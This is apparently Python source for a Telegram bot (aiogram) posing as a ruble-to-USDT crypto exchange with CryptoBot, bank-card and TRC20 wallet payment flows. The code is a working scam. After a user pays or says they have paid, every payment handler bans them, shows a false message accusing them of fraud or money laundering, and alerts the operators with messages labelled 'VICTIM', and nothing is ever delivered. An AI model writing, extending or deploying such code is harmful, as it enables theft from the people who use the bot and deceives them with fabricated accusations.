from aiogram import Router, F, types
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from datetime import datetime
from data.texts import *
from data.keyboards import *
from database.models import is_banned, ban_user, add_transaction, get_user
from services.crypto_pay import CryptoPay
import os

router = Router()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "872151895,6593438966").split(",")]

class ExchangeStates(StatesGroup):
    waiting_buy_amount = State()

@router.callback_query(F.data == "buy_crypto")
async def buy_crypto(call: CallbackQuery):
    if is_banned(call.from_user.id):
        await call.answer("🚫 Вы заблокированы!")
        return
    
    await call.message.edit_text(
        "💎 <b>КУПИТЬ КРИПТУ</b>\n\n"
        "Курс: 1 USDT = 75₽\n\n"
        "Выберите способ оплаты:",
        reply_markup=buy_keyboard()
    )
    await call.answer()

# ========== ПОКУПКА ЧЕРЕЗ CRYPTOBOT ==========
@router.callback_query(F.data == "buy_crypto_bot")
async def buy_crypto_bot(call: CallbackQuery, state: FSMContext):
    await state.set_state(ExchangeStates.waiting_buy_amount)
    await call.message.edit_text(
        "💎 <b>ПОКУПКА USDT ЧЕРЕЗ CRYPTOBOT</b>\n\n"
        "Курс: 1 USDT = 75₽\n\n"
        "Введите сумму в рублях:",
        reply_markup=InlineKeyboardBuilder().button(text="◀️ НАЗАД", callback_data="buy_crypto").as_markup()
    )
    await call.answer()

@router.message(ExchangeStates.waiting_buy_amount)
async def process_buy_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 100:
            await message.answer("❌ Минимальная сумма: 100₽"); return
    except:
        await message.answer("❌ Введите число!"); return
    
    await state.clear()
    
    invoice = await CryptoPay.create_invoice(amount)
    if invoice:
        add_transaction(message.from_user.id, "buy", amount, "RUB", invoice["asset"])
        
        builder = InlineKeyboardBuilder()
        builder.button(text="💸 ПЕРЕЙТИ К ОПЛАТЕ", url=invoice["pay_url"])
        builder.button(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_{invoice['invoice_id']}")
        builder.button(text="◀️ НАЗАД", callback_data="start")
        builder.adjust(1)
        
        await message.answer(
            f"💎 <b>СЧЁТ СОЗДАН!</b>\n\n"
            f"Сумма: {amount}₽\n"
            f"К получению: ~{invoice['amount']} {invoice['asset']}\n\n"
            f"Нажмите «Перейти к оплате»",
            reply_markup=builder.as_markup()
        )
    else:
        await message.answer("❌ Ошибка создания счёта.")

# ========== ПОКУПКА ЧЕРЕЗ КАРТУ ==========
@router.callback_query(F.data == "buy_card")
async def buy_card(call: CallbackQuery):
    if is_banned(call.from_user.id): return
    
    await call.message.edit_text(
        f"💳 <b>ПОКУПКА USDT ЧЕРЕЗ КАРТУ</b>\n\n"
        f"Курс: 1 USDT = 75₽\n\n"
        f"💳 Карта: <code>{CARD}</code>\n"
        f"🏦 Банк: {BANK}\n\n"
        f"1. Переведите нужную сумму на карту\n"
        f"2. Нажмите «Я ОПЛАТИЛ»",
        reply_markup=InlineKeyboardBuilder()
            .button(text="✅ Я ОПЛАТИЛ", callback_data="paid_card")
            .button(text="◀️ НАЗАД", callback_data="buy_crypto")
            .adjust(1).as_markup()
    )
    await call.answer()

# ========== ПРОВЕРКА ОПЛАТЫ ==========
@router.callback_query(F.data.startswith("check_"))
async def check_payment(call: CallbackQuery):
    inv_id = int(call.data.split("_")[1])
    status = await CryptoPay.check_invoice(inv_id)
    
    if status == "paid":
        ban_user(call.from_user.id, "Подозрительная активность")
        await call.message.edit_text(
            "🚫 <b>АККАУНТ ЗАБЛОКИРОВАН!</b>\n\n"
            "Причина: подозрение на мошенничество.\n"
            f"Обратитесь в поддержку: {SUPPORT_URL}",
            reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url=SUPPORT_URL).as_markup()
        )
        for aid in ADMIN_IDS:
            try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА CRYPTO!</b>\n👤 {call.from_user.id}")
            except: pass
    elif status == "active":
        await call.answer("⏳ Счёт ещё не оплачен", show_alert=True)
    else:
        await call.answer("❌ Счёт истёк", show_alert=True)
    await call.answer()

# ========== ОПЛАТА КАРТОЙ ==========
@router.callback_query(F.data == "paid_card")
async def paid_card(call: CallbackQuery):
    add_transaction(call.from_user.id, "buy", 0, "RUB", "CARD")
    ban_user(call.from_user.id, "Подозрительная активность")
    
    await call.message.edit_text(
        f"🚫 <b>АККАУНТ ЗАБЛОКИРОВАН!</b>\n\n"
        f"Причина: попытка обмана системы.\n"
        f"Обратитесь в поддержку: {SUPPORT_URL}",
        reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url=SUPPORT_URL).as_markup()
    )
    
    for aid in ADMIN_IDS:
        try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА КАРТУ!</b>\n👤 {call.from_user.id}")
        except: pass
    await call.answer()

# ========== ПРОДАЖА КРИПТЫ ==========
@router.callback_query(F.data == "sell_crypto")
async def sell_crypto(call: CallbackQuery):
    if is_banned(call.from_user.id): return
    
    await call.message.edit_text(
        "💰 <b>ПРОДАТЬ КРИПТУ</b>\n\n"
        "Курс: 1 USDT = 70₽\n\n"
        f"Отправьте USDT на кошелёк:\n<code>{USDT_WALLET}</code>\n\n"
        "Сеть: TRC20\n\n"
        "После отправки нажмите «Я ОТПРАВИЛ»",
        reply_markup=sell_keyboard()
    )
    await call.answer()

@router.callback_query(F.data == "sent_crypto")
async def sent_crypto(call: CallbackQuery):
    add_transaction(call.from_user.id, "sell", 0, "USDT", USDT_WALLET)
    ban_user(call.from_user.id, "Транзакция отклонена")
    
    await call.message.edit_text(
        f"🚫 <b>ТРАНЗАКЦИЯ ОТКЛОНЕНА!</b>\n\n"
        f"Причина: подозрение на отмывание средств.\n"
        f"Обратитесь в поддержку: {SUPPORT_URL}",
        reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url=SUPPORT_URL).as_markup()
    )
    
    for aid in ADMIN_IDS:
        try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА USDT!</b>\n👤 {call.from_user.id}")
        except: pass
    await call.answer()
